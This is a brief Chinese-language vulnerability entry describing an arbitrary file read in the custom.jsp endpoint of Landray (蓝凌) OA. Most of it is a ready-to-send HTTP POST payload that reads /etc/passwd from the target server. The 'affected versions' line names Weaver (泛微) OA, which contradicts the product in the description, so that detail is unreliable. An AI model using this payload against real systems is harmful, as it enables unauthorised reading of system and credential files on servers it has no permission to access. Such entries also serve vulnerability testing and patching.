**漏洞描述：**

蓝凌OA custom.jsp接口存在任意文件读取漏洞。

**影响版本：**

泛微OA

**Payload：**

```
POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
Host:host
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 42
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

var={"body":{"file":"file:///etc/passwd"}}
```

---

---
